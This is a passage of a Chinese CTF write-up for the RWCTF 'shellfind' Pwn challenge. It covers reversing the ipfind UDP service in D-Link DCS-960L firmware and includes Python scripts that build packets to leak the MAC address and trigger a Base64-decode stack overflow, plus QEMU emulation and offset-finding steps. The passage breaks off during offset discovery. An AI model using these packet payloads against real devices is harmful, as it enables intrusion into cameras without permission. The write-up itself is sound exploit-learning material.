> 题目类型为Pwn，难度描述为 difficulty:Normal，具体描述如下：
>  
>  
>     Hello Hacker.
>     You don't know me, but I know you.
>     I want to play a game. Here's what happens if you lose.
>     The device you are watching is hooked into your Saturday and Sunday.
>     When the timer in the back goes off,
>     your curiosity will be permanently ripped open.
>     Think of it like a reverse bear trap.
>     Here, I'll show you.
>     There is only one UDP service to shell the device.
>     It's in the stomach of your cold firmware.
>     Look around Hacker. Know that I'm not lying.
>     Better hurry up.
>     Shell or out, make your choice.
>
> 题目文件：<https://github.com/Larryxi/rwctf-5th-shellfind>

## 题目远程环境配置

    
    
    sudo docker run --name shellfind -d --privileged -p 4444/udp --rm 1arry/shellfind
    

## 初步分析

首先把题目给的固件解包，然后发现是D-link DCS 960L，再从官网上下载个最新的固件

最新的固件下载链接：<https://www.dlinktw.com.tw/techsupport/ProductInfo.aspx?m=DCS-960L>

下载之后直接diff比较一下，最大的差距是下面这个

    
    
    Binary files squashfs-root/usr/sbin/ipfind and squashfs-root2/usr/sbin/ipfind differ
    

刚好ipfind是udp服务，符合题目描述，所以对这两个文件进行分析

用bindiff查看一下，发现`401ca4`这个地方被手动patch过了，属于`40172C`函数

![](./img/9169998094871681167.png)

现在初步分析之后确定ipfind程序为目标程序

## 漏洞分析

先完整分析一下ipfind，首先是下面这个部分

    
    
    ifname = argv[1];
        v4 = ipfind_pid() < 0;
        result = 0;
        if ( !v4 )
        {
          setup_signal_handlers();
          server_sockfd = socket(2, 1, 17);         // udp
          if ( server_sockfd == -1 )
          {
            my_puts("Can't get server socket\n");
            return -1;
          }
          else
    

如果ipfind正常运行

  * 注册信号处理函数
  * 创建udp套接字

    
    
    v12.sa_family = 2;
            memset(&v12.sa_data[2], 0, 12);
            *v12.sa_data = 62720;
            strncpy(v13, ifname, 0x10u);
            if ( setsockopt(server_sockfd, 0xFFFF, 25, v13, 0x20u) >= 0 )
            {
              if ( setsockopt(server_sockfd, 0xFFFF, 32, &v9, 4u) >= 0 )
              {
                if ( setsockopt(server_sockfd, 0xFFFF, 4, &v10, 4u) >= 0 )
                {
                  if ( bind(server_sockfd, &v12, 0x10u) >= 0 )
                  {
    

如果套接字创建成功，则绑定到62720端口上

    
    
    struct sockaddr {
    unsigned short sa_family; /* address family, AF_xxx */
    char sa_data[14]; /* 14 bytes of protocol address */
    };
    

sa_family为2代表是udp，sa_data=62720则代表要绑定到62720端口上

如果绑定成功就到了最核心的地方

    
    
    sub_4013D0("IPFind start(%s)...\n", ifname);
                    v18 = user_data;
                    v21 = &user_data[17];
                    addr_len = &v11;
                    v20 = "FIVI";
                    v22 = &v16;
                    v23 = &unk_402E90;
                    while ( 1 )
                    {
                      v5 = &v14;
                      if ( dword_413168 )
                        break;
                      do
                      {
                        *v5 = 0;
                        v5 += 4;
                      }
                      while ( v5 != user_data );
                      v6 = server_sockfd;
                      v14.__fds_bits[server_sockfd >> 5] |= 1 << server_sockfd;
                      if ( select(v6 + 1, &v14, 0, 0, 0) >= 0 )
                      {
                        if ( ((v14.__fds_bits[server_sockfd >> 5] >> server_sockfd) & 1) != 0 )
                        {
                          v11 = 16;
                          memset(user_data, 0, 0x800u);
                          recvfrom(server_sockfd, user_data, 0x800u, 0, &client_addr, addr_len);
                          *&user_data[4] = (*&user_data[4] << 24) | user_data[4] | ((*&user_data[4] & 0xFF0000u) >> 8) | ((*&user_data[4] & 0xFF00) << 8);
                          v7 = ((_byteswap_ushort(*&user_data[9]) << 8) | ((user_data[10] | (user_data[9] << 8)) >> 8));
                          *&user_data[9] = v7;
                          *&user_data[11] = (_byteswap_ushort(*&user_data[11]) << 8) | ((user_data[12] | (user_data[11] << 8)) >> 8);
                          v8 = ((_byteswap_ushort(*&user_data[23]) << 8) | ((user_data[24] | (user_data[23] << 8)) >> 8));
                          *&user_data[23] = v8;
                          v17 = (*&user_data[25] << 24) | user_data[25] | ((*&user_data[25] & 0xFF0000u) >> 8) | ((*&user_data[25] & 0xFF00) << 8);
                          *&user_data[25] = v17;
                          if ( !strncmp(v18, v20, 4u) && user_data[8] == 10 )
                          {
                            if ( v7 == 1 )
                            {
                              if ( !v8 && !memcmp(v21, v23, 6u) && !v17 )
                                sub_40172C(user_data);
                            }
                            else if ( v7 == 2
                                   && net_get_hwaddr(ifname, v22) >= 0
                                   && !memcmp(v21, v22, 6u)
                                   && *&user_data[25] == 142 )
                            {
                              sub_4013F4(user_data, 142);
                            }
                          }
                        }
                      }
    

`recvfrom(server_sockfd, user_data, 0x800u, 0, &client_addr, addr_len);`

  * 最大接收0x800个数据到user_data中

如果满足一些条件，会进入`sub_40172C`函数和`sub_40172C`函数

  * `!strncmp(v18, v20, 4u)`
    * v18和v20要相等，v20是`FIVI`，v18是`user_data`起始的数据，所以第一步`user_data = 'FIVI'`
  * `user_data[8] == 10`
    * 第9个数要为`'\n'`，所以`user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n'`
  * `v7 == 1`

    * `((_byteswap_ushort(*&user_data[9]) << 8) | ((user_data[10] | (user_data[9] << 8)) >> 8)) == 1`
    * 当user_data[9] = 0x1，user_data[10] = 0的时候满足这个条件
    * 也就是`user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n' + '\x01\x00'`
  * `!memcmp(v21, v23, 6u)`

    * v21和v23要相等，v23是`0xff * 6`，这里其实就是mac_addr
    * `user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n' + '\x01\x00' + \x00\x00\x00\x00\x00\x00 + '\xff' * 6`
  * !v8

    * v8要为0，`v8 = ((_byteswap_ushort(*&user_data[23]) << 8) | ((user_data[24] | (user_data[23] << 8)) >> 8))`
    * 23和24都为0的时候v8就为0
    * `user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n' + '\x01\x00' + \x00\x00\x00\x00\x00\x00 + '\xff' * 6 + '\x00\x00'`
  * !v17

    * v17要为0，`v17 = (*&user_data[25] << 24) | user_data[25] | ((*&user_data[25] & 0xFF0000u) >> 8) | ((*&user_data[25] & 0xFF00) << 8)`
    * 当25为0就可以满足条件
    * `user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n' + '\x01\x00' + \x00\x00\x00\x00\x00\x00 + '\xff' * 6 + '\x00\x00' + '\x00'`

所以进入`sub_40172C`函数的开头是

    
    
    p1 = b'FIVI'
    p1 += b'\x00\x00\x00\x00'
    p1 += b'\n'
    p1 += b'\x01\x00'
    p1 += b'\x00\x00\x00\x00\x00\x00'
    p1 += b'\xff' * 6
    p1 += b'\x00\x00'
    p1 += b'\x00'
    

现在写一个连接脚本，并发送p1

    
    
    import socket
    from pwn import *
    
    context(os='linux', arch='mips', endian='big', log_level='debug')
    
    li = lambda x : print('\x1b[01;38;5;214m' + str(x) + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + str(x) + '\x1b[0m')
    lg = lambda x : print('\033[32m' + str(x) + '\033[0m')
    
    ip = '192.168.10.200'
    port = 62720
    
    r = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    lg('[+] open connection')
    
    p1 = b'FIVI'
    p1 += b'\x00\x00\x00\x00'
    p1 += b'\n'
    p1 += b'\x01\x00'
    p1 += b'\x00\x00\x00\x00\x00\x00'
    p1 += b'\xff' * 6
    p1 += b'\x00\x00'
    p1 += b'\x00'
    
    r.sendto(p1, (ip, port))
    
    recv_data, recv_addr = r.recvfrom(1024)
    
    li(recv_data)
    

最后可以接收到`sub_40172C`返回的东西

    
    
    iot@attifyos ~/i/rwctf_2023> python3 exp.py
    [+] open connection
    b'FIVI\x00\x00\x00\x01\x0b\x01\x00\x00\x00\xc0\xa8\n\xc8\x00\x16>\x00\x00\x01\x00\x00\x00\x02\x00\x00D-Link\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00DCS-960L\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00DCS-960L\x00\x00\x00\x00\x00\x00\x00\x001.9.0\x00\x00\x00\x01\x00\x01\x00\x00\x00DCS-960L\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\x00\xc0\xa8\x00\x01\xc0\xa8\x00\x01\x00\x00\x00\x00P\x00*\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    

### sub_40172C

这个函数会获取设备的基本信息，其中里面最重要的是mac地址，因为mac地址关乎着漏洞触发点的发生

看一下`sub_400E50`这个函数

    
    
    int __fastcall sub_400E50(int a1, int a2)
    {
      unsigned int v3; // $v1
      unsigned int v4; // $v0
      int v6; // [sp+18h] [-8h] BYREF
    
      *a1 = *"FIVI";
      *(a1 + 4) = 0x1000000;
      *(a1 + 8) = 0xB;
      v3 = *(a2 + 10) | (*(a2 + 9) << 8);
      *(a1 + 9) = _byteswap_ushort(*(a2 + 9));
      v4 = *(a2 + 12) | (*(a2 + 11) << 8);
      *(a1 + 11) = _byteswap_ushort(*(a2 + 11));
      *(a1 + 4) = 1;
      *(a1 + 9) = (v3 >> 8) | (v3 << 8);
      *(a1 + 11) = (v4 >> 8) | (v4 << 8);
      if ( net_get_ifaddr(ifname, &v6) >= 0 )
        *(a1 + 13) = v6;
      return net_get_hwaddr(ifname, a1 + 17);
    }
    

这里会调用`net_get_hwaddr`得到设备的mac地址，并会存在`17 - 17 + 6`这里

所以继续写一下脚本来得到mac地址

    
    
    def getmac(mac_addr):
        hex_str = binascii.hexlify(mac_addr).decode()
        mac_addr = ':'.join([hex_str[i:i+2] for i in range(0, len(hex_str), 2)])
        li('[+] mac = ' + str(mac_addr))
    
    if(len(recv_data) == 0x21d):
        mac_addr = recv_data[0x11:0x17]
        getmac(mac_addr)
    else:
        ll("[-] recv error")
    

结果如下

    
    
    iot@attifyos ~/i/rwctf_2023> python3 exp.py
    [+] open connection
    [+] mac = 00:16:3e:00:00:01
    

### sub_4013F4

    
    
    else if ( v7 == 2
                                   && net_get_hwaddr(ifname, v22) >= 0
                                   && !memcmp(v21, v22, 6u)
                                   && *&user_data[25] == '\x8E' )
                            {
                              (sub_4013F4)(user_data, '\x8E');
    

  * 回到主函数，继续往下看，首先v7变成2了
    * 也就是`user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n' + '\x02\x00'`
  * `net_get_hwaddr(ifname, v22) >= 0`
    * 这里就是mac地址放入了v22
  * `!memcmp(v21, v22, 6u)`
    * 这里就是v21需要和v22相等
    * 也就是`user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n' + '\x01\x00' + \x00\x00\x00\x00\x00\x00 + mac`
  * `*&user_data[25] == '\x8E'`
    * 也就是`user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n' + '\x01\x00' + \x00\x00\x00\x00\x00\x00 + '\xff' * 6 + '\x00\x00' + '\x8E'`

所以逆出进入4013F4的格式是

    
    
    p2 = b'FIVI'
    p2 += b'\x00\x00\x00\x00'
    p2 += b'\n'
    p2 += b'\x02\x00'
    p2 += b'\x00\x00\x00\x00\x00\x00'
    p2 += mac
    p2 += b'\x00\x00'
    p2 += b'\x8E'
    

接着进入4013F4函数，漏洞点发生在`400f50`这个函数里

### sub_400F50

    
    
    if ( !sub_400F50(a1 + 0x1D, a1 + 0x5D) )
    

a1就是上面的p2

    
    
    int __fastcall sub_400F50(int a1, int a2)
    {
      int Group; // $s1
      int Pass; // $s0
      char v6[256]; // [sp+18h] [-344h] BYREF
      char v7[256]; // [sp+118h] [-244h] BYREF
      char v8[256]; // [sp+218h] [-144h] BYREF
      char v9[68]; // [sp+318h] [-44h] BYREF
    
      memset(v9, 0, 64);
      Base64decs(a1, v6);
      Base64decs(a2, v7);
      cfgRead("USER_ADMIN", "Username1", v9);
      usrInit(0);
      Group = usrGetGroup(v6);
      Pass = usrGetPass(v6, v8, 256);
      if ( Pass == 1 )
      {
        if ( !Group && !strcmp(v9, v6) )
          Pass = strcmp(v7, v8) != 0;
      }
      else
      {
        Pass = -1;
      }
      usrFree();
      return Pass;
    }
    

在第二个`Base64decs(a2, v7);`中，会对a2进行base64解码，然后将解码之后的数据存到v7中，a2 = p2 +
0x5d，也就是0x5d后面的数据会进行base64decode到v7中，p2可控，这就造成了栈溢出漏洞

所以给出如下poc即可验证

    
    
    p2 = b'FIVI'
    p2 += b'\x00\x00\x00\x00'
    p2 += b'\n'
    p2 += b'\x02\x00'
    p2 += b'\x00\x00\x00\x00\x00\x00'
    p2 += mac_addr
    p2 += b'\x00\x00'
    p2 += b'\x8E'
    p2 = p2.ljust(0x5d, b'\x00')
    
    p3 = b'a' * 0x300
    
    p2 += base64.b64encode(p3)
    li(p2)
    
    r.sendto(p2, (ip, port))
    

p3这里就是a2，运行之后就能看到ipfind程序崩溃

## 固件模拟

没有真机，这里用固件模拟

首先准备一个bash启动脚本，里面要包含需要的东西，`vmlinux-3.2.0-4-4kc-malta`，`debian_wheezy_mips_standard.qcow2`

    
    
    sudo ifconfig ens32 down
    sudo brctl addbr br0
    sudo brctl addif br0 ens32
    sudo ifconfig br0 0.0.0.0 promisc up
    sudo ifconfig ens32 0.0.0.0 promisc up
    sudo dhclient br0
    sudo tunctl -t tap0
    sudo brctl addif br0 tap0
    sudo ifconfig tap0 0.0.0.0 promisc up
    sudo qemu-system-mips \
        -M malta -kernel vmlinux-3.2.0-4-4kc-malta \
        -hda debian_wheezy_mips_standard.qcow2 \
        -append "root=/dev/sda1 console=tty0" \
        -net nic,macaddr=00:16:3e:00:00:01 \
        -net tap,ifname=tap0,script=no,downscript=no \
        -nographic
    

然后还要准备一个完整的busybox和一个gdbserver，启动脚本，默认账号密码是root:root

    
    
    root@debian-mips:~# ifconfig
    eth0      Link encap:Ethernet  HWaddr 00:16:3e:00:00:01
              inet6 addr: fe80::216:3eff:fe00:1/64 Scope:Link
              UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
              RX packets:14 errors:0 dropped:0 overruns:0 frame:0
              TX packets:12 errors:0 dropped:0 overruns:0 carrier:0
              collisions:0 txqueuelen:1000
              RX bytes:840 (840.0 B)  TX bytes:2288 (2.2 KiB)
              Interrupt:10 Base address:0x1020
    
    lo        Link encap:Local Loopback
              inet addr:127.0.0.1  Mask:255.0.0.0
              inet6 addr: ::1/128 Scope:Host
              UP LOOPBACK RUNNING  MTU:16436  Metric:1
              RX packets:0 errors:0 dropped:0 overruns:0 frame:0
              TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
              collisions:0 txqueuelen:0
              RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
    

进去之后却发现eth0没有正常运行，所以我们给他加上一个ip

    
    
    root@debian-mips:~# ifconfig eth0 192.168.10.200/24 up
    

此时可以看到eth0正常

    
    
    root@debian-mips:~# ifconfig
    eth0      Link encap:Ethernet  HWaddr 00:16:3E:00:00:01
              inet addr:192.168.10.200  Bcast:192.168.10.255  Mask:255.255.255.0
              inet6 addr: fe80::216:3eff:fe00:1/64 Scope:Link
              UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
              RX packets:1028 errors:0 dropped:0 overruns:0 frame:0
              TX packets:219 errors:0 dropped:0 overruns:0 carrier:0
              collisions:0 txqueuelen:1000
              RX bytes:1104487 (1.0 MiB)  TX bytes:26470 (25.8 KiB)
              Interrupt:10 Base address:0x1020
    
    lo        Link encap:Local Loopback
              inet addr:127.0.0.1  Mask:255.0.0.0
              inet6 addr: ::1/128 Scope:Host
              UP LOOPBACK RUNNING  MTU:16436  Metric:1
              RX packets:3 errors:0 dropped:0 overruns:0 frame:0
              TX packets:3 errors:0 dropped:0 overruns:0 carrier:0
              collisions:0 txqueuelen:0
              RX bytes:276 (276.0 B)  TX bytes:276 (276.0 B)
    

接下来就要真正的启动固件啦

    
    
    mount -t proc /proc ./squashfs-root/proc
    mount -o bind /dev ./squashfs-root/dev
    chroot ./squashfs-root/ sh
    

然后用上面的命令把固件作为主体，进行相应的挂载操作，然后启动sh，此时成功模拟出了一个固件

    
    
    root@debian-mips:~# chroot ./squashfs-root/ sh
    # ls
    bin                                  root
    busybox-mips                         sbin
    dev                                  server
    etc                                  share
    gdbserver-7.7.1-mips-mips-i-v1-sysv  sys
    home                                 tmp
    lib                                  usr
    mnt                                  var
    mydlink                              web
    proc
    

但是里面的服务还没有真正的启动，所以执行一下固件里的启动脚本

    
    
    # /etc/rc.d/rcS
    

固件里的服务启动完毕，直接寻找一下ipfind服务

    
    
    # ./busybox-mips netstat -ulnp
    netstat: showing only processes with your user ID
    Active Internet connections (only servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
    udp        0      0 0.0.0.0:111             0.0.0.0:*                           1575/rpcbind
    udp        0      0 0.0.0.0:902             0.0.0.0:*                           1575/rpcbind
    udp        0      0 127.0.0.1:934           0.0.0.0:*                           1606/rpc.statd
    udp        0      0 0.0.0.0:49110           0.0.0.0:*                           1606/rpc.statd
    udp        0      0 0.0.0.0:8166            0.0.0.0:*                           2306/dhclient
    udp        0      0 0.0.0.0:62976           0.0.0.0:*                           7743/ddp
    udp        0      0 0.0.0.0:62720           0.0.0.0:*                           7601/ipfind
    udp        0      0 0.0.0.0:62976           0.0.0.0:*                           3335/ddp
    udp        0      0 0.0.0.0:68              0.0.0.0:*                           2306/dhclient
    udp        0      0 :::111                  :::*                                1575/rpcbind
    udp        0      0 :::902                  :::*                                1575/rpcbind
    udp        0      0 :::37004                :::*                                1606/rpc.statd
    udp        0      0 :::15167                :::*                                2306/dhclient
    

可以看到ipfind在62720这里开启了一个监听，和上面分析得一样

    
    
    # ps aux | grep ipfind
     7601 0         2096 S    /usr/sbin/ipfind br0
    12490 0          788 S    grep ipfind
    

但是ps看了一下发现这个在br0，但是我们的有效网卡是eth0，所以kill掉这个ipfind，重新启动

    
    
    # kill 7601
    # ps aux | grep ipfind
    26451 0          788 S    grep ipfind
    # /usr/sbin/ipfind eth0 &
    # ps aux | grep ipfind
    28360 0         2096 S    /usr/sbin/ipfind eth0
    28440 0          788 S    grep ipfind
    # ./busybox-mips netstat -ulnp
    netstat: showing only processes with your user ID
    Active Internet connections (only servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
    udp        0      0 0.0.0.0:111             0.0.0.0:*                           1575/rpcbind
    udp        0      0 0.0.0.0:902             0.0.0.0:*                           1575/rpcbind
    udp        0      0 127.0.0.1:934           0.0.0.0:*                           1606/rpc.statd
    udp        0      0 0.0.0.0:49110           0.0.0.0:*                           1606/rpc.statd
    udp        0      0 0.0.0.0:8166            0.0.0.0:*                           2306/dhclient
    udp        0      0 0.0.0.0:62720           0.0.0.0:*                           28360/ipfind
    udp        0      0 0.0.0.0:62976           0.0.0.0:*                           7743/ddp
    udp        0      0 0.0.0.0:62976           0.0.0.0:*                           3335/ddp
    udp        0      0 0.0.0.0:68              0.0.0.0:*                           2306/dhclient
    udp        0      0 :::111                  :::*                                1575/rpcbind
    udp        0      0 :::902                  :::*                                1575/rpcbind
    udp        0      0 :::37004                :::*                                1606/rpc.statd
    udp        0      0 :::15167                :::*                                2306/dhclient
    

现在就可以用gdbserver进行远程调试了，用法如下

    
    
    ./gdbserver-mips :6666 --attach 28360
    

然后就可以用IDA或者gdb-multiarch来进行调试，笔者这里的gdb-multiarch调试失败了，所以改用了ida调试

## 漏洞利用

首先肯定要确定偏移，这里用如下脚本生成垃圾数据

    
    
    # coding:utf-8
    '''
    生成定位字符串：轮子直接使用
    '''
    
    import argparse
    import struct
    import binascii
    import string
    import sys
    import re
    import time
    a ="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    b ="abcdefghijklmnopqrstuvwxyz"
    c = "0123456789"
    def generate(count,output):
        # pattern create
        codeStr =''
        print '[*] Create pattern string contains %d characters'%count
        timeStart = time.time()
        for i in range(0,count):
            codeStr += a[i/(26*10)] + b[(i%(26*10))/10] + c[i%(26*10)%10]
        print 'ok!'
        if output:
            print '[+] output to %s'%output
            fw = open(output,'w')
            fw.write(codeStr)
            fw.close()
            print 'ok!'
        else:
            return codeStr
        print "[+] take time: %.4f s"%(time.time()-timeStart)
    
    def patternMatch(searchCode, length=1024):
    
       # pattern search
       offset = 0
       pattern = None
    
       timeStart = time.time()
       is0xHex = re.match('^0x[0-9a-fA-F]{8}',searchCode)
       isHex = re.match('^[0-9a-fA-F]{8}',searchCode)
    
       if is0xHex:
           #0x41613141
           pattern = binascii.a2b_hex(searchCode[2:])
       elif isHex:
           pattern = binascii.a2b_hex(searchCode)
       else:
           print  '[-] seach Pattern eg:0x41613141'
           sys.exit(1)
    
       source = generate(length,None)
       offset = source.find(pattern)
    
       if offset != -1: # MBS
           print "[*] Exact match at offset %d" % offset
       else:
           print
           "[*] No exact matches, looking for likely candidates..."
           reverse = list(pattern)
           reverse.reverse()
           pattern = "".join(reverse)
           offset = source.find(pattern)
    
           if offset != -1:
               print "[+] Possible match at offset %d (adjusted another-endian)" % offset
    
       print "[+] take time: %.4f s" % (time.time() - timeStart)
    
    def mian():
       '''
       parse argument
       '''
       parser = argparse.ArgumentParser()
       parser.add_argument('-s', '--search', help='search for pattern')
       parser.add_argument('-c', '--create', help='create a pattern',action='store_true')
       parser.add_argument('-f','--file',help='output file name',default='patternShell.txt')
       parser.add_argument('-l', '--length', help='length of pattern code',type=int, default=1024)
       args = parser.parse_args()
       '''
       save all argument
       '''
       length= args.length
       output = args.file
       createCode = args.create
       searchCode = args.search
    
       if createCode and (0 <args.length <= 26*26*10):
           generate(length,output)
       elif searchCode and (0 <args.length <=26*26*10):
           patternMatch(searchCode,length)
       else:
           print '[-] You shoud chices from [-c -s]'
           print '[-] Pattern length must be less than 6760'
           print 'more help: pattern.py -h'
    
    if __name__ == "__main__":
       if __name__ == '__main__':
           mian()
    
    
    
    python2 pattern.py -c -l 800 -f content
    

生成了800个垃圾数据，如下poc进行偏移确定

    
    
    p2 = b'FIVI'
    p2 += b'\x00\x00\x00\x00'
    p2 += b'\n'
    p2 += b'\x02\x00'
    p2 += b'\x00\x00\x00\x00\x00\x00'
    p2 += mac_addr
    p2 += b'\x00\x00'
    p2 += b'\x8E'
    p2 = p2.ljust(0x5d, b'\x00')
    
    p3 = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0